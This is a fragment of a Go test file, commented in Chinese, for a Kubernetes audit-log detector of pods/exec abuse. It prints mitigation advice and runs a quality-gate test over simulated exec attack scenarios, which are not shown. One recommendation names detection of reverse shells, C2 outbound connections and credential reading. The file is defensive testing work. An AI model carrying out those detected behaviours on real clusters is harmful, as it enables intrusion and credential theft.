	t.Logf("  通过率: %.1f%%", passRate)
	t.Log("")

	// 攻击向量覆盖
	t.Log("【攻击向量覆盖】")
	vectorMap := map[attackVector]int{}
	for _, res := range report.Results {
		vectorMap[res.Scenario.Vector]++
	}
	for v, count := range vectorMap {
		t.Logf("  %s: %d 个场景", v, count)
	}
	t.Log("")

	// 缓解建议
	t.Log("【缓解建议】")
	printMitigationRecommendations(t)
	t.Log("")
	t.Log("============================================================")
}

// printMitigationRecommendations 输出针对 exec 滥用的缓解建议。
// 建议基于 ATT&CK 缓解策略和 Kubernetes 安全最佳实践。
func printMitigationRecommendations(t *testing.T) {
	t.Helper()

	recommendations := []struct {
		Category   string
		Suggestion string
	}{
		{
			Category:   "RBAC 收紧",
			Suggestion: "限制 pods/exec 子资源的 create 权限，仅授予必要的运维人员和服务账号",
		},
		{
			Category:   "审计日志启用",
			Suggestion: "确保 kube-apiserver 审计策略覆盖 exec/attach/portforward，级别不低于 RequestResponse",
		},
		{
			Category:   "匿名访问禁用",
			Suggestion: "设置 --anonymous-auth=false，拒绝 system:anonymous 的任何 API 调用",
		},
		{
			Category:   "命名空间隔离",
			Suggestion: "kube-system 命名空间实施严格 NetworkPolicy 和 RBAC，阻断非节点身份的 exec",
		},
		{
			Category:   "Service Account 最小权限",
			Suggestion: "避免使用 default SA，为每个工作负载创建专用 SA 并绑定最小 Role",
		},
		{
			Category:   "Token 保护",
			Suggestion: "启用 BoundServiceAccountTokenVolume，设置短过期时间，限制 audience",
		},
		{
			Category:   "容器运行时加固",
			Suggestion: "设置 readOnlyRootFilesystem=true, allowPrivilegeEscalation=false, drop ALL capabilities",
		},
		{
			Category:   "Seccomp 配置",
			Suggestion: "应用 RuntimeDefault 或自定义 seccomp profile，限制系统调用面",
		},
		{
			Category:   "准入控制",
			Suggestion: "部署 OPA Gatekeeper / Kyverno，拦截敏感命名空间的 exec 请求",
		},
		{
			Category:   "实时检测",
			Suggestion: "将 Kestrel sidecar 部署为审计日志流处理器，实时归一化并转发至检测引擎",
		},
		{
			Category:   "命令审计",
			Suggestion: "对 exec 命令进行模式匹配，检测反向 shell、C2 外联、凭证读取等高危模式",
		},
		{
			Category:   "Docker daemon 加固",
			Suggestion: "启用 Docker daemon TLS 认证，限制 /var/run/docker.sock 访问权限",
		},
	}

	for i, r := range recommendations {
		t.Logf("  %d. [%s] %s", i+1, r.Category, r.Suggestion)
	}
}

// TestExecAttackSuccessCriteria 验证 exec 检测的量化成功标准。
// 这是质量门禁测试：所有标准必须满足才能通过 CI。
func TestExecAttackSuccessCriteria(t *testing.T) {
	scenarios := execAttackScenarios()
	report := attackReport{}

	for _, sc := range scenarios {
		res := runExecScenario(t, sc)
		report.Results = append(report.Results, res)
	}

	// 标准 1: 归一化成功率
	// 所有非健壮性场景必须成功归一化。
	normalizeFail := 0
	for _, res := range report.Results {
		if res.Scenario.Criteria.ExpectError {
			continue
		}
		if res.Error != nil {
			normalizeFail++
		}
	}
	t.Run("归一化成功率_100%", func(t *testing.T) {
		if normalizeFail > 0 {
			t.Errorf("归一化失败 %d 个场景（预期 0）", normalizeFail)
		}
	})

	// 标准 2: 动作类型准确性
	// 所有 exec/attach 场景必须映射为 ContainerExec。
	actionFail := 0
	for _, res := range report.Results {
		if res.Scenario.Criteria.ActionType == model.ContainerExec {
			for _, ev := range res.Events {
				if ev.Action.Type != model.ContainerExec {
					actionFail++
				}
			}
		}
	}
	t.Run("动作类型准确性", func(t *testing.T) {
		if actionFail > 0 {
			t.Errorf("动作类型映射错误 %d 处（预期 0）", actionFail)
		}
	})

	// 标准 3: 命令提取完整性
	// 所有携带 command 参数的场景必须正确提取命令。
	cmdFail := 0
	for _, res := range report.Results {
		if res.Scenario.Criteria.Command != "" {
			for _, ev := range res.Events {
				if ev.Action.Command != res.Scenario.Criteria.Command {
					cmdFail++
				}
			}
		}
	}
	t.Run("命令提取完整性", func(t *testing.T) {
		if cmdFail > 0 {
			t.Errorf("命令提取错误 %d 处（预期 0）", cmdFail)
		}
	})

	// 标准 4: 身份分类准确性
	identityFail := 0
	for _, res := range report.Results {
		for _, ev := range res.Events {
			if ev.Actor.IdentityType != res.Scenario.Criteria.IdentityType {
				identityFail++
			}
		}
	}
	t.Run("身份分类准确性", func(t *testing.T) {
		if identityFail > 0 {
			t.Errorf("身份分类错误 %d 处（预期 0）", identityFail)
		}
	})

	// 标准 5: 健壮性
	// 畸形输入必须返回错误，不能 panic。
	robustFail := 0
	for _, res := range report.Results {
		if res.Scenario.Criteria.ExpectError && res.Error == nil {
			robustFail++
		}
	}
	t.Run("健壮性_无panic", func(t *testing.T) {
		if robustFail > 0 {
			t.Errorf("健壮性测试失败 %d 处：畸形输入未返回错误", robustFail)
		}
	})

	// 标准 6: 总体通过率
	totalPass := 0
	for _, res := range report.Results {
		if res.Passed {
			totalPass++
		}
	}
	t.Run("总体通过率_100%", func(t *testing.T) {
		if totalPass != len(report.Results) {
			t.Errorf("总体通过率: %d/%d（预期 100%%）", totalPass, len(report.Results))
		}
	})
}
